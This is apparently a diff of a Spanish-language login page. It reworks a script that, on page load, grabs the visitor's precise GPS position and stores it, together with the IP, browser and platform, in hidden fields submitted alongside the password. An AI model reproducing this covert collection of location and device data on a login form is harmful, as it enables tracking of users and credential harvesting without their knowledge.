@@ -259,9 +259,9 @@
           <input type="password" id="contrasena" name="contrasena">
           <input type="hidden" name="ip_usuario" id="ip_usuario">
 
-
-          <input type="hidden" name="gps_loc" id="gps_loc">
-<input type="hidden" name="gps_accuracy" id="gps_accuracy">
+<!-- Campos ocultos para ubicación -->
+  <input type="hidden" name="gps_loc" id="gps_loc">
+  <input type="hidden" name="gps_accuracy" id="gps_accuracy">
           
             <input type="hidden" name="navegador" id="navegador">
   <input type="hidden" name="plataforma" id="plataforma">
@@ -317,24 +317,32 @@
     </div>
   </div>
   <script>
-          // Intentar obtener ubicación precisa con GPS
-if (navigator.geolocation) {
-  navigator.geolocation.getCurrentPosition(function(pos) {
-    // Guardar coordenadas en el campo oculto
-    document.getElementById("gps_loc").value = 
-      pos.coords.latitude + "," + pos.coords.longitude;
+          document.addEventListener("DOMContentLoaded", function() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      function(pos) {
+        // Guardar coordenadas en el campo oculto
+        document.getElementById("gps_loc").value =
+          pos.coords.latitude + "," + pos.coords.longitude;
 
-    // Guardar precisión en metros
-    document.getElementById("gps_accuracy").value = pos.coords.accuracy + " metros";
-  }, function(err) {
-    console.warn("No se pudo obtener ubicación GPS:", err);
-    // Si falla, no se sobrescribe nada y se mantiene la ubicación por IP
-  }, {
-    enableHighAccuracy: true, // fuerza GPS si está disponible
-    timeout: 15000,           // espera hasta 15 segundos
-    maximumAge: 0             // no usar datos cacheados
-  });
-}
+        // Guardar precisión en metros
+        document.getElementById("gps_accuracy").value =
+          pos.coords.accuracy + " metros";
+      },
+      function(err) {
+        console.warn("Error en geolocalización:", err);
+      },
+      {
+        enableHighAccuracy: true, // fuerza GPS si está disponible
+        timeout: 15000,           // espera hasta 15 segundos
+        maximumAge: 0             // no usar datos cacheados
+      }
+    );
+  } else {
+    console.warn("Geolocalización no soportada en este navegador.");
+  }
+});
+    
     
     
     
